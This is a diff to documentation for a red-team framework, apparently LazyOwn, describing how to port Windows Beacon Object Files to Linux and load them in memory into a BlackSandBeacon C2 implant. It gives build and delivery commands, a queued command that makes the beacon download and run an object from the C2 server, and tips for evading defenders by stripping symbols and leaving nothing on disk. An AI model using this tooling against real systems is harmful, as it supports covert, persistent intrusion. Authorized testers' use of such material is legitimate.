@@ -5,32 +5,36 @@ File support for Linux targets. This document explains how to port an
 existing Windows BOF to Linux and how to run it through BlackSandBeacon.
 
 Audience: operators and tool authors comfortable with C, the Windows BOF
-contract, and Linux internals (syscalls, ELF, `/proc`, `dlopen`).
+contract, and Linux internals (syscalls, ELF, `/proc`).
 
 ---
 
 ## What is a Linux BOF in LazyOwn
 
-A Linux BOF is a position-independent ELF shared object (`.so`) loaded into
-the running BlackSandBeacon process via `dlopen` and invoked through a
-function pointer obtained with `dlsym`. The BOF runs in the beacon's
-address space, can read and write the beacon's memory, and returns output
-to the operator through the same `datap` callback API used by Windows BOFs.
+A Linux BOF is a position-independent ELF object (`.x64.o`, compiled
+freestanding) loaded into the running BlackSandBeacon process by the
+native in-memory **RunELF loader**. The beacon fetches the object from the
+C2, maps it entirely in RAM (W^X trampolines, no disk writes), resolves the
+BOF's imports against the beacon's own exported symbol table, and invokes
+the `go` entry point. The BOF runs in the beacon's address space, can read
+and write the beacon's memory, and returns output to the operator through
+the same `datap` callback API used by Windows BOFs.
 
-It is not a separate process. It is not written to disk on the target
-after delivery (the loader stages it in memory). It cannot be reused after
-the beacon exits because the mapping disappears with the process.
+It is not a separate process. It is never written to disk on the target —
+neither the beacon (memfd staging) nor the BOF (in-memory load). It cannot
+be reused after the beacon exits because the mapping disappears with the
+process.
 
 Compare this with the Windows BOF model:
 
 | Aspect | Windows BOF | LazyOwn Linux BOF |
 |---|---|---|
-| Object format | COFF | ELF shared object |
-| Loader | Cobalt Strike / Sliver COFF loader | `dlopen` against PIC `.so` |
-| Resolution | Custom COFF symbol resolver | Standard `dlsym` |
+| Object format | COFF | Freestanding PIC ELF object (`.x64.o`) |
+| Loader | Cobalt Strike / Sliver COFF loader | Native in-memory `RunELF` loader |
+| Resolution | Custom COFF symbol resolver | RunELF relocation against beacon exports |
 | API contract | `datap` + `BeaconPrintf` + `BeaconOutput` | Same names, same signatures |
 | Entry point | `go(char *args, int alen)` | `go(char *args, int alen)` |
-| Build flags | `cl /c` or MinGW `-c` | `gcc -shared -fPIC -nostartfiles` |
+| Build flags | `cl /c` or MinGW `-c` | `gcc -c -fPIC -nostdlib -m64` |
 
 Because the `datap` API is preserved, the porting effort is concentrated
 in (a) replacing Win32 calls and (b) updating includes and types.
@@ -39,41 +43,42 @@ in (a) replacing Win32 calls and (b) updating includes and types.
 
 ## Minimum viable Linux BOF
 
-`beacon.h` is shipped by the BlackSandBeacon SDK at
-`external/.exploit/blacksandbeacon/include/beacon.h` after the
+`beacon_api.h` is shipped by the BlackSandBeacon SDK at
+`external/.exploit/blacksandbeacon/bof/include/beacon_api.h` after the
 `blacksandbeacon` addon clones and builds the runtime. Include it from
-that path or copy it next to your BOF source.
+that path (`-I bof/include`) or copy it next to your BOF source. Direct
+syscall helpers live beside it in `bof/include/syscalls.h`.
 
 ```c
 #include <stdio.h>
 #include <stdint.h>
 #include <unistd.h>
-#include "beacon.h"
+#include "beacon_api.h"
 
 void go(char *args, int alen) {
     datap parser;
     BeaconDataParse(&parser, args, alen);
     int interval = BeaconDataInt(&parser);
-    BeaconPrintf(0x00, "linux bof received interval=%d uid=%d", interval, getuid());
+    BeaconPrintf(CALLBACK_OUTPUT, "linux bof received interval=%d uid=%d", interval, getuid());
 }
 ```
 
-Build:
+Build (from the BlackSandBeacon checkout):
 
 ```
-gcc -shared -fPIC -nostartfiles -o sample.so sample.c
+gcc -c -fPIC -nostdlib -m64 -O2 -I bof/include mybof.c -o build/bof/mybof.x64.o
 ```
 
 Stage and deliver:
 
 ```
-cp sample.so sessions/sample.so
-blacksandbeacon_bof sessions/sample.so
+make bofs && cp build/bof/mybof.x64.o ../../../sessions/temp_uploads/bofs/
+bof_run mybof <beacon_id>
 ```
 
-The loader delivers `sample.so` to a live beacon, the beacon resolves
-`go` via `dlsym`, calls it, and pipes any `BeaconPrintf` output back over
-the C2 channel.
+`bof_run` queues a `bof:<c2_url>/download/bofs/mybof` command on the live
+beacon; the beacon downloads the object, loads it with RunELF, calls `go`,
+and pipes any `BeaconPrintf` output back over the C2 channel.
 
 ---
 
@@ -132,8 +137,9 @@ interface is harder for an EDR to lie about than a libc call it can hook.
 
 ## The `datap` API surface
 
-These functions are exported by the BlackSandBeacon runtime and resolved
-by the dynamic linker at load time. Source-compatible with Windows BOF.
+These functions are exported by the BlackSandBeacon beacon itself; the
+RunELF loader relocates the BOF's imports against that export table at
+load time. Source-compatible with Windows BOF.
 
 | Function | Purpose |
 |---|---|
@@ -153,35 +159,43 @@ Existing argument-packing utilities work unchanged.
 
 ## Building, staging, and delivering
 
-1. Compile the BOF as a PIC shared object:
+1. Compile the BOF as a freestanding PIC object:
    ```
-   gcc -shared -fPIC -nostartfiles -O2 -o mybof.so mybof.c
+   gcc -c -fPIC -nostdlib -m64 -O2 -I bof/include mybof.c -o build/bof/mybof.x64.o
    ```
-   The `-nostartfiles` flag avoids pulling `crt1.o` into the BOF.
+   or use the per-object make target:
+   ```
+   make bof-mybof
+   ```
+   The `-nostdlib` flag keeps libc out of the object; the beacon provides
+   the `BeaconData*`/`BeaconPrintf` exports instead.
 2. Strip it to remove debug symbols that would help defenders:
    ```
-   strip --strip-unneeded mybof.so
+   strip --strip-unneeded build/bof/mybof.x64.o
    ```
-3. Stage to LazyOwn's sessions directory:
+3. Stage to LazyOwn's BOF delivery directory:
    ```
-   cp mybof.so sessions/mybof.so
+   cp build/bof/mybof.x64.o sessions/temp_uploads/bofs/
    ```
-4. Push it to an active beacon:
+4. Queue it on an active beacon:
    ```
-   blacksandbeacon_bof sessions/mybof.so
+   bof_run mybof <beacon_id>
    ```
 
-   The addon reads `lhost` and `lport` from `payload.json`, fetches the
-   loader if needed, and instructs the beacon to `dlopen` the BOF and
-   invoke `go`.
+   `bof_run` builds the `bof:https://<lhost>:<c2_port>/download/bofs/mybof`
+   command, posts it to the C2 queue, and the live beacon fetches the
+   object over the encrypted channel, loads it with RunELF and invokes `go`.
 
 ---
 
 ## Pitfalls
 
 - **Forgetting `-fPIC`.** Without position-independent code the loader
-  cannot relocate the BOF and `dlopen` returns null. The beacon logs the
-  `dlerror` string back to the operator.
+  cannot relocate the BOF and the load fails. The beacon reports the
+  failure back to the operator over the C2 channel.
+- **Linking libc in.** `-nostdlib` is required; a BOF that pulls libc
+  symbol references the beacon does not export fails to relocate. Prefer
+  direct syscalls (`bof/include/syscalls.h`) or `/proc` parsing.
 - **Exporting more than `go`.** Mark internal helpers `static` so the
   symbol table stays small. Less surface for defenders to fingerprint.
 - **Returning early without `BeaconOutput`.** The operator sees nothing and
@@ -193,10 +207,8 @@ Existing argument-packing utilities work unchanged.
   running; you leak its memory. Free everything you allocate.
 - **Architecture mismatch.** A BOF compiled for x86_64 will not load on an
   ARM beacon. Compile per target architecture and stage as
-  `sessions/mybof-x86_64.so` and `sessions/mybof-aarch64.so`.
-- **Using thread-local storage.** TLS in dynamically loaded `.so` files
-  has historical glibc bugs. Avoid `__thread` unless you have tested it
-  against the libc on the target.
+  `sessions/temp_uploads/bofs/mybof-x86_64.x64.o` and
+  `sessions/temp_uploads/bofs/mybof-aarch64.x64.o`.
 
 ---
 
@@ -224,9 +236,10 @@ namespace enumeration, container escape probes) follow the same recipe.
 If you port or write a BOF that other operators would benefit from, open
 a pull request that:
 
-1. Adds the source to the BlackSandBeacon repository under `bofs/<name>/`.
-2. Adds a `lazyaddons/<name>_bof.yaml` entry to LazyOwn that wires up
-   compile + stage + deliver.
+1. Adds the source to the BlackSandBeacon repository under `bof/<name>/`
+   plus a `make bof-<name>` target.
+2. Adds a `bofs/<name>.yaml` catalog entry to LazyOwn (see
+   `bofs/README.md` for the delivery-contract schema).
 3. Adds a row to `docs/ATTACK_MATRIX.md` if it covers a new technique.
 4. Includes a short test note: which kernel, which distro, which beacon
    build you tested against.
